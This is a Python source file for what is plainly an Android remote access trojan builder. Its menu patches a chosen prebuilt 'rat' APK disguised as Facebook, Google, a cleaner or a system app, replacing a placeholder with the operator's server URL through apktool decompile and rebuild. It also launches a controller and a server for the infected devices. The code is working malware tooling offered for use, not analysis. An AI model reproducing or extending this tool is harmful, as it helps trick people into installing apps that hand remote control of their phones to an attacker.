import os
import sys
import subprocess
import xml.etree.ElementTree as ET
import requests as r
import os
import sys
import time as t
import base64
import controller
import shutil
def clear() :
    if os.name  == 'nt' :
       os.system("cls")
    else :
       os.system("clear")
       
       
      

# Colors
GREEN_BOLD = "\033[1;92m"
RESET = "\033[0m"



def run_cmd(cmd):
    """Run a shell command and capture output/errors."""
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = process.communicate()
    if process.returncode != 0:
        print(f"[!] Error: {err.decode().strip()}")
        sys.exit(1)
    return out.decode().strip()

def replace_in_files(folder, old_text, new_text):
    """Search and replace text in XML + smali files."""
    replaced = False
    for root, _, files in os.walk(folder):
        for file in files:
            if file.endswith((".xml", ".smali")):  # check XML + smali
                filepath = os.path.join(root, file)
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                if old_text in content:
                    content = content.replace(old_text, new_text)
                    with open(filepath, "w", encoding="utf-8", errors="ignore") as f:
                        f.write(content)
                    print('[*] '+GREEN_BOLD+f"Replaced in {filepath}"+RESET)
                    replaced = True
    return replaced

def payload(apk_file, new_url):
    if not os.path.exists(apk_file):
        print("[!] APK file not found:", apk_file)
        return

    print('[*] '+GREEN_BOLD+'Initializing decompile process...'+RESET)

    out_dir = "decompiled_apk"

    # Try full decode (without -r so binary XML gets converted too)
    run_cmd(f"apktool d -f \"{apk_file}\" -o {out_dir}")

    print('[*] '+GREEN_BOLD+'APK decompiled (resources fully decoded)'+RESET)

    print('[*] '+GREEN_BOLD+'Searching XML + smali files for "past_url_here"...'+RESET)

    if not replace_in_files(out_dir, "past_url_here", new_url):
        print("[!] Could not find 'past_url_here' in XML or smali files.")
        print("[!] It might be stored inside resources.arsc (binary string pool).")
        print("[!] You can confirm with:")
        print("    grep -R 'past_url_here' decompiled_apk/")
        return

    print('[*] '+GREEN_BOLD+'Replacement complete! Rebuilding APK...'+RESET)
    path, apk_file = os.path.split(apk_file)
    final_apk = f"final_{apk_file}"
    run_cmd(f"apktool b {out_dir} -o {final_apk}")

    print('[*] '+GREEN_BOLD+f'Here is this APK: {final_apk} (modified & rebuilt)'+RESET)
    
    shutil.rmtree("decompiled_apk")



       
clear()

while True :

 print()
 print('[1] '+GREEN_BOLD+'Payload '+RESET)
 print('[2] '+GREEN_BOLD+'Controller'+RESET)
 print('[3] '+GREEN_BOLD+'Server '+RESET)
 print()
 opt = input("Enter the option: ")
 print() 
 opt = int(opt)
 if opt == 1 :
    print('[*] '+GREEN_BOLD+'facebook'+RESET)
    print('[*] '+GREEN_BOLD+'cleaner'+RESET)
    print('[*] '+GREEN_BOLD+'google'+RESET)
    print('[*] '+GREEN_BOLD+'android'+RESET)
    opt1 = input("Enter the application(defualt=andorid.apk): ")
    url = input("Enter the server url: ")
    if opt1 == "" or opt1 == "cleaner" :
       payload("rat/Cleaner.apk", url)
    elif opt1 == "facebook" :
       payload("rat/Facebook.apk", url)
    elif opt1 == "google" :
       payload("rat/Google.apk", url)   
    elif opt1 == "android" :
       payload("rat/Android.apk", url)   
    else :
       print("chose facebook, cleaner, google, android")
 elif opt == 3 :
    script_path = os.path.join("server.py")
    subprocess.run([sys.executable, script_path])
    
 elif opt == 2 :
    controller.controller()
 else :
    print("chose 1 or 2 or 3")  
